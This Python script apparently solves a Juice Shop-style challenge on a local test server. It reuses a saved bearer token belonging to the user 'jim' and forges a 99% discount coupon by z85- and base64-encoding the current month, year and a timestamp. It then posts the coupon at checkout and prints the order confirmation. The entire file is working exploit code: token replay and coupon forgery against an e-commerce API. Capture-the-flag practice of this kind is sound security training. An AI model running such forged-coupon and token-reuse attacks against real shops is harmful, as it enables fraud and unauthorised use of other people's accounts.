from zmq.utils import z85
from datetime import datetime
import base64
import time
import requests

PERCENT = "99"

data = {
    "couponData": "",
    "orderDetails": {
        "paymentId": "5",
        "addressId": "4",
        "deliveryMethodId": "1"
    }
}
basket = {"ProductId": 32, "BasketId": "2", "quantity": 1}

#get appropriate header
f = open("prerequisites/jim", "r")
a = "Bearer " + f.readline().strip()
headers = {
    'Authorization': a,
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "44",
    "Origin": "http://127.0.0.1:3000",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "no-cors",
    "Sec-Fetch-Site": "same-origin",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache"
}

basketurl = "http://127.0.0.1:3000/api/BasketItems/"
url = "http://localhost:3000/rest/basket/2/checkout"  # we buy for jim
# add basket item for jim
#x = requests.post(basketurl, data=basket, headers=headers)
#print(x.text)
# generate coupon
now = datetime.now()
unencoded = now.strftime('%B')[:3].upper()
year = now.year
unencoded += str(year)[2:] + "-" + PERCENT
encoded = z85.encode(unencoded.encode()).decode()
print("Generated key: " + encoded)
curr = int(time.time())
message = f"{encoded}-{curr}"
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes).decode()
data["couponData"] = base64_bytes
print(f"Encoded key: {base64_bytes}")

# add coupon
x = requests.post(url, data=data, headers=headers)
#print(x.text)
res = x.json()
code = res["orderConfirmation"]
print(f"Confirmation code: {code}")
